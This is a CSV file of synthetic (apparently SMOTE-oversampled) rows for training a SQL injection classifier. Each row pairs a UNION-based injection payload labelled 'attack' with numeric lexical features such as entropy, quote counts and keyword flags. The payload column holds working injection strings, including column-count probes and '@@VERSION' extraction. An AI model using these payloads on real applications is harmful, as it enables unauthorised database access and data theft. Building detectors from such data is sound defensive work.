id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000404,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,0.7772439334496666,58.11338236905865,16.867913601933836,3.2736093457093918,40.11338236905865,1.0,7.471654407735338,9.528345592264662,0.6880061712904404,0.017332990483864413,0.1313257906450173,0.1633350475806779,1.0,0.0,0.26417279613233124,0.0,0.0,0.0,0.0,0.8679136019338344,1.0,0.0,5.528345592264662,0.26417279613233147,1.0,0.0,0.1320863980661655,0.8679136019338345,0.0,0.0,0.8679136019338344,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000405,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,1.12787977649501,60.6190853139935,21.73015244766775,3.8843308555123253,13.999999999999998,30.158780418658004,6.920609790670999,9.539695104664501,0.23137752427746833,0.49596705499582905,0.11560972493810714,0.1570456957885956,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.7301524476677496,0.2698475523322505,0.0,5.539695104664501,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.7301524476677496,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000406,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.878482191343369,74.08494697225362,31.54247348612681,4.368508036429398,44.0,2.0,17.0,11.084946972253624,0.5940205174832586,0.027000932612875395,0.2295079272094408,0.14947062269442526,-5.551115123125783e-17,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,6.084946972253624,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000407,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000021,0.44939525823365345,57.117346386656415,18.576530722668718,3.603879570041437,13.999999999999998,29.69387710932513,3.999999999999999,9.423469277331282,0.24556277290509398,0.5193568309656068,0.07016079225859828,0.16491960387070084,-5.551115123125783e-17,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.423469277331282,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000408,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000022,1.1630126333447326,64.24045356896397,23.0,3.859419670397206,33.68034017672298,9.0,14.439886607759007,7.1202267844819875,0.5236380817006211,0.14050050101340758,0.22614058676765902,0.10972083051831227,-5.551115123125783e-17,1.0,1.560113392240994,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.340170088361491,2.5601133922409938,0.0,1.0,0.7800566961204969,0.21994330387950312,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000409,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000006,0.3785955198788645,79.70717745006384,28.234258039948934,4.050635789056317,40.234258039948934,2.9414354900127666,22.648612940076603,13.882870980025535,0.5050755908655602,0.03686555114180498,0.2839373256424433,0.1741215323501915,2.824306470038301,0.0,2.0,0.0,1.058564509987233,1.0,0.0,1.882870980025534,0.0,0.0,1.0,5.117129019974465,0.9414354900127672,0.0,1.0,0.0,0.0,1.0,0.941435490012767,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000410,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,0.43311094964940294,57.177659941033895,16.926396253685382,3.289622007146961,39.177659941033895,1.0,7.705585014741527,9.294414985258472,0.6838288390224727,0.01756506449875153,0.13643141897253333,0.16217467750624243,1.0,0.0,0.14720749262923616,0.0,0.0,0.0,0.0,0.9263962536853818,1.0,0.0,5.294414985258473,0.14720749262923638,1.0,0.0,0.07360374631461808,0.926396253685382,0.0,0.0,0.9263962536853818,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000411,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.2651533190833275,73.2040218383735,32.0,4.365894403505409,44.0,2.0,17.0,10.204021838373512,0.6011000984678658,0.02732273174853936,0.2322432198625845,0.13933394992101028,-5.551115123125783e-17,0.0,2.0,0.0,1.102010919186756,1.0,0.0,0.0,0.0,0.0,1.0,5.204021838373512,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000412,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,0.04182097783117016,60.11115118990918,18.0,3.5211848944409074,13.999999999999998,32.09880105769705,3.999999999999999,10.01235013221213,0.23295745974426846,0.5339060930880988,0.06655927421264814,0.16657717295498456,-5.551115123125783e-17,0.9876498677878686,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.024700264424263,3.0,0.0,0.9876498677878686,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000413,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.5199411379838699,74.45841393570599,31.729206967852996,4.380046252259625,44.0,2.0,17.0,11.458413935705993,0.5910191391468377,0.026864506324856263,0.22834830376127818,0.15376805076702785,-5.551115123125783e-17,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,6.458413935705993,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000414,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,0.09925293645796919,73.7269005478026,19.96098579254323,3.6424757699112997,13.999999999999998,39.84394317017292,7.921971585086458,11.960985792543228,0.1900503135880098,0.5403999488019575,0.1072997056112561,0.16225003199877652,-5.551115123125783e-17,1.0,1.0390142074567712,0.0,0.0,0.0,0.0,0.9804928962716144,0.0,0.0,7.960985792543228,1.039014207456771,0.0,1.0,0.0195071037283856,0.9804928962716144,0.0,0.0,0.9804928962716144,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000415,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,0.918775926642228,67.02911879174097,15.0,3.0289648826299604,50.0,1.0,5.029118791740975,11.0,0.7464381083144915,0.014928762166289855,0.07441674569003041,0.16421638382918816,0.7427203020647559,0.0,2.0,0.0,0.0,0.0,0.0,0.2572796979352441,0.0,0.0,8.0,2.0,0.7427203020647559,0.0,1.0,0.0,0.0,0.0,0.2572796979352441,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000416,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000024,0.14027554428738492,58.21222584023258,23.0,3.9125076031252313,29.15916938017443,9.0,15.946943539941856,4.106112920116288,0.5008038857584567,0.15467345021888892,0.2741711368529014,0.07035152716975296,-5.551115123125783e-17,1.0,0.05305646005814357,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.07958469008721547,1.0530564600581436,0.0,1.0,0.026528230029071787,0.9734717699709283,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000417,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000024,2.2268364459813186,61.36902799564514,23.0,3.8847070441543954,31.526770996733855,9.0,15.157743001088715,5.68451399782257,0.512761469680474,0.14725150157763683,0.2490189775686581,0.09096805117323106,-5.551115123125783e-17,1.0,0.8422569989112851,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.2633854983669282,1.8422569989112851,0.0,1.0,0.42112849945564257,0.5788715005443574,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000418,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.0572000652715008,73.0,30.94518905620145,4.31854594539302,41.849312722314494,3.9041236661130423,16.698625444628988,10.54793816694348,0.5732782564700616,0.05348114611113755,0.2287482937620409,0.14449230365675997,0.15068727768550688,0.0,2.0,0.0,0.8493127223144931,1.0,0.0,0.15068727768550694,0.0,0.0,1.150687277685507,4.849312722314493,0.1506872776855069,0.0,1.0,0.0,0.0,1.0,0.15068727768550688,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.8493127223144932,0.0,0.8493127223144932,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.698625444628986
SMOTE_000419,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,0.5473231228719362,56.0,16.78574987042247,3.280462816694472,38.8570005183101,1.0,7.142999481689894,9.0,0.6938750092555377,0.01785714285714285,0.12755356217303382,0.16071428571428573,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7857498704224735,1.0,0.0,5.214250129577526,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.7857498704224735,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000420,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000030,2.5247150188135925,76.98056081509873,16.0,3.1203245073344834,45.53827628008775,1.0,18.0,12.44228453501097,0.590563082895466,0.013033651718159261,0.2346057309268665,0.1617975344595082,0.442284535010969,0.557715464989031,1.115430929978062,0.0,0.0,0.0,0.0,3.0,0.0,0.0,6.8845690700219375,1.1154309299780623,0.4422845350109689,0.557715464989031,0.5577154649890309,0.44228453501096904,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000421,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,1.2986362053511022,70.99401650185298,20.33399816646078,3.6428469825885665,13.999999999999998,38.66400733415688,6.664007334156879,11.66600183353922,0.19793841350812025,0.5449845909882516,0.09255393154111959,0.16452306396250865,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.6660018335392197,0.3339981664607803,0.0,7.6660018335392195,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.6660018335392197,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000422,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000013,0.15014254499772772,56.18568993523781,21.03713798704756,3.7216247960700133,13.999999999999998,20.14855194819025,14.0,8.037137987047561,0.24923897567525488,0.3584909573752628,0.24923897567525488,0.14303109127422745,0.9628620129524377,0.037137987047562604,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,3.0371379870475623,1.0,0.9628620129524375,0.037137987047562604,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000423,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000030,0.6399421394293945,71.5675722475445,16.477475917485165,3.2115175606416164,38.65766857760383,3.268010608054542,18.0,11.641893061886126,0.5340605820274446,0.05120080892441886,0.25236552875459217,0.16237308029354436,-5.551115123125783e-17,0.8806310206287082,2.1193689793712918,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.641893061886125,2.1193689793712918,0.0,0.8806310206287082,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000424,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,1.1573299557070122,67.35457962203034,18.735457962203032,3.612634228065308,13.999999999999998,37.88366369762427,3.999999999999999,11.470915924406068,0.20881806792656557,0.5613507795124966,0.05966230512187587,0.17016884743906208,0.7354579622030337,0.2645420377969663,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.470915924406067,3.0,0.7354579622030337,0.2645420377969663,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000425,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,1.2703592560504615,67.42292646634907,15.0,3.031825390028851,50.0,1.0,5.422926466349062,11.0,0.7421761204940578,0.014843522409881155,0.07970161058736837,0.1632787465086927,0.6442683834127343,0.0,2.0,0.0,0.0,0.0,0.0,0.3557316165872657,0.0,0.0,8.0,2.0,0.6442683834127343,0.0,1.0,0.0,0.0,0.0,0.3557316165872657,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000426,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,0.3927136759094848,65.22891623545488,15.077108376454511,3.0331694904450885,49.383132988363904,1.0,3.999999999999999,10.845783247090974,0.7569916032086779,0.015360141711186437,0.0614405668447458,0.1662076882353898,1.0,0.0,1.8457832470909752,0.0,0.0,0.0,0.0,0.0,0.07710837645451242,0.0,7.845783247090975,1.8457832470909752,1.0,0.0,0.9228916235454876,0.07710837645451243,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000427,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,1.9279127290177926,61.77498887206902,21.61250556396549,3.806913975812445,13.999999999999998,24.0,14.0,9.774988872069013,0.2266849221418251,0.3886027236717001,0.2266849221418251,0.15802743204464967,-5.551115123125783e-17,1.0,1.7749888720690132,0.0,0.0,0.0,0.0,2.0,0.38749443603450673,0.0,4.0,1.7749888720690135,0.0,1.0,0.3874944360345067,0.6125055639654933,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000428,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.6059681398339469,73.63119433329089,31.315597166645446,4.354489404544291,44.0,2.0,17.0,10.631194333290894,0.5976671140338266,0.0271666870015376,0.23091683951306935,0.14424935945156644,-5.551115123125783e-17,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,5.631194333290893,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000429,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.5350702095700534,74.77279570436895,32.11360214781553,4.39715856475289,43.77279570436894,2.113602147815527,17.0,11.886397852184471,0.5853802131206278,0.0283058574753291,0.2273721411919138,0.15894178821212931,-5.551115123125783e-17,0.0,2.0,0.0,1.8863978521844709,1.0,0.0,0.0,0.0,0.0,1.0,6.772795704368942,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.11360214781552935,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.113602147815529
SMOTE_000430,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000007,0.5105467069203237,70.34739309856923,15.115797699523075,3.0629617424322344,49.073618403815395,1.0,9.157976995230756,11.115797699523075,0.6981964057414122,0.014217731291865127,0.12960454889972584,0.15798131406699684,-5.551115123125783e-17,0.11579769952307561,2.0,0.0,0.0,0.0,0.0,1.2315953990461512,0.0,0.0,7.768404600953849,2.0,0.0,0.11579769952307561,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000431,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,1.3997216791349174,69.10277478543887,20.753419263778635,3.7001110666303703,13.999999999999998,33.9726458897709,10.26025779133591,10.869871104332045,0.20437774767475764,0.4851273381536315,0.15384069080091858,0.1566542233706923,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.3767096318893184,0.0,0.0,6.4931614724427265,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000024,1.838889209617806,58.257688214329214,22.742311785670786,3.9300229917590803,25.134676785061803,13.89607607225505,13.938494285366295,5.288441071646066,0.43230224877791856,0.23747902345465519,0.23971643983693094,0.09050228793049532,-5.551115123125783e-17,1.0,0.2576882143292132,0.0,0.0,0.7423117856707868,0.0,1.0,0.0,0.0,1.2884410716460661,1.0,0.0,1.0,0.0,1.0,0.0,0.7423117856707868,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.7423117856707868,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.742311785670787
SMOTE_000433,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.04754100484862923,73.04952011646647,31.024760058233234,4.336518651269203,44.0,2.0,17.0,10.04952011646647,0.6023417561416393,0.027379170733710878,0.23272295123654246,0.1375561218881073,-5.551115123125783e-17,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,5.04952011646647,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000434,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,1.3339153008870537,61.0,21.475692754984742,3.743355531340799,13.999999999999998,22.951385509969487,15.048614490030513,9.0,0.22950819672131148,0.3762522214749096,0.2466985981972215,0.14754098360655737,-5.551115123125783e-17,0.7378463774923716,1.5243072450152566,0.0,0.0,0.0,0.0,2.262153622507628,0.0,0.0,3.737846377492372,1.5243072450152566,0.0,0.7378463774923716,0.26215362250762814,0.7378463774923718,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000435,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000017,1.1034677110044377,63.415958506760916,21.264006915539845,3.727541290208535,13.999999999999998,33.887944675681226,5.056027662159386,10.471986168920306,0.2211672961943539,0.5329183566299573,0.08108942999043454,0.1648249171852542,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.2640069155398468,0.7359930844601533,0.0,6.471986168920306,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.2640069155398468,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
